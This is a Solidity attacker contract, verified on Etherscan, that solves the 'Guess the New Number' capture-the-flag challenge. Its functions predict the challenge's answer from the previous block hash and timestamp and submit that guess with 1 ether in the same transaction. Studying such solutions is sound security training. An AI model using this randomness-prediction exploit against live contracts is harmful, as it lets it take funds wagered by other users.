/**
 *Submitted for verification at Etherscan.io on 2022-07-19
*/

pragma solidity ^0.4.21;

interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) public payable;
    function isComplete() public view returns (bool);
}

contract CTFGuessTheNewNumber {
    address public guessschallangeAddress;

    function CTFGuessTheNewNumber() public payable{
        require(msg.value == 1 ether);
    }

    function setGuessMeAddress(address _address) public {
        guessschallangeAddress = _address;
    }

    function getGuessAddress() public view returns(address) {
        return guessschallangeAddress;
    }
    
    function doCaptureByBlockNum(uint nBlockNum) public payable {
        require(msg.value == 1 ether);

        IGuessTheNewNumberChallenge guessInstance = IGuessTheNewNumberChallenge(guessschallangeAddress);
        uint8 answer = uint8(keccak256(block.blockhash(nBlockNum), now));
        guessInstance.guess.value(1 ether)(answer);
    }

    function doCapture() public payable {
        require(msg.value == 1 ether);

        IGuessTheNewNumberChallenge guessInstance = IGuessTheNewNumberChallenge(guessschallangeAddress);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        guessInstance.guess.value(1 ether)(answer);
    }

    function doExample() public payable {
        
        IGuessTheNewNumberChallenge guessInstance = IGuessTheNewNumberChallenge(guessschallangeAddress);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        guessInstance.guess.gas(100000).value(1 ether)(answer);
    }

    function dontHaveCap() public {
        
        IGuessTheNewNumberChallenge guessInstance = IGuessTheNewNumberChallenge(guessschallangeAddress);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        guessInstance.guess.value(1 ether)(answer);
    }

    function dontHaveCapExample() public view returns(uint8){
        
        IGuessTheNewNumberChallenge guessInstance = IGuessTheNewNumberChallenge(guessschallangeAddress);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        return answer;
    }

    function hasComplete() public returns(bool){
        
        IGuessTheNewNumberChallenge guessInstance = IGuessTheNewNumberChallenge(guessschallangeAddress);
        bool complete = guessInstance.isComplete();
        return complete;
    }
}